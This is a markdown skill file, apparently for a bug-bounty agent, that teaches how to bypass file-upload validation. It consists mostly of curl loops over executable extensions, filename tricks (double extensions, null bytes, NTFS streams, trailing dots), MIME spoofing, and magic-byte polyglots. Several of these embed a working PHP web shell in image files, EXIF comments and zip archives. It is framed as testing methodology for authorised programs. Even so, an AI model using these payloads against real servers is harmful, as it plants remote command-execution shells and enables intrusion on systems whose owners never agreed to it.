---
name: attack-upload-bypass
description: "Upload validation bypass — extension blacklist/whitelist evasion, MIME spoofing, client-side disabled, content-length and archive tricks to get ANY file stored"
category: "input-validation"
version: "1.0"
author: "bountyreper-official"
tags:
  - file-upload
  - bypass
  - extension
  - mime
tech_stack:
  - web
  - php
cwe_ids:
  - CWE-434
chains_with:
  - attack-file-upload
  - attack-upload-polyglot
prerequisites:
  - attack-file-upload
---

# Upload Validation Bypass

## Objective

Get a file with attacker-chosen EXTENSION (or content) past the validation and STORED
on the server. Storing is step one; execution/render bugs follow from the polyglot /
doc-xml sub-skills.

> **Attribution:** Methodology from [KathanP19/HowToHunt — File_Upload](https://github.com/KathanP19/HowToHunt/tree/master/File_Upload). Licensed GPL-3.0.

## Methodology

### 1. Client-side validation (never trust it)

```bash
# Just skip the JS: send the request directly
curl -X POST https://TARGET/upload -F "file=@payload.php;type=image/jpeg"
```

### 2. Extension bypass ladder

```bash
# Blacklist → alternates
for ext in php5 php7 phtml phar php3 php4 php5.inc shtml ashx aspx jsp jspx war; do
  curl -F "file=@shell.$ext" https://TARGET/upload
done
# Whitelist (jpg/png/pdf allowed) → mixed tricks
curl -F "file=@shell.jpg.php"  ...    # double extension
curl -F "file=@shell.php.jpg"  ...    # reversed double (some parse leftmost)
curl -F "file=@shell.PHP"      ...    # case
curl -F "file=@shell.php%00.jpg" ...  # null byte (legacy PHP/Java)
curl -F "file=@shell.php:.jpg" ...    # NTFS ADS (Windows IIS)
curl -F "file=@shell.php."       ...  # trailing dot (Windows strips)
curl -F "file=@shell.php\n.jpg" ...   # newline (some validators split on \n)
```

### 3. MIME bypass

```bash
# Valid image MIME with bad content — validation reads ONLY the header type
curl -F "file=@shell.php;type=image/png" https://TARGET/upload
# SVG with script — often whitelisted as image/svg+xml (doc-xml sub-skill covers it)
```

### 4. Content/Magic-byte bypass

```bash
# GIF magic + PHP code (accepted by getimagesize() checks)
echo -e "GIF89a\n<?php system(\$_GET['c']); ?>" > shell.gif.php
# PNG magic prefix
printf "\x89PNG\r\n\x1a\n" | cat - shell.php > shell.png.php
# JPEG comment section (EXIF) carrying PHP
exiftool "-Comment=<?php system(\$_GET['c']); ?>" out.jpg
```

### 5. Length/zip tricks

```bash
# Content-length lies: chunked upload / overlong filename padding (500×'A') to skip checks
python3 - <<'PY'
import zipfile
with zipfile.ZipFile('shell.zip','w') as z: z.writestr('shell.php','<?php system($_GET[c]);?>')
PY
# If zip archive is accepted + extracted server-side → arbitrary extension lands
```

## Proof

- Stored file URL + its served `Content-Type` (screenshot)
- Server-side rejection message before/after the successful bypass attempt
- Then: does it execute/render? → polyglot sub-skill for the execution stage

## Notes

- Rate: the ladder is cheap — run it scripted, but ONE attempt per combo; 500s from
  brute-ish uploads can trigger lockouts on real programs
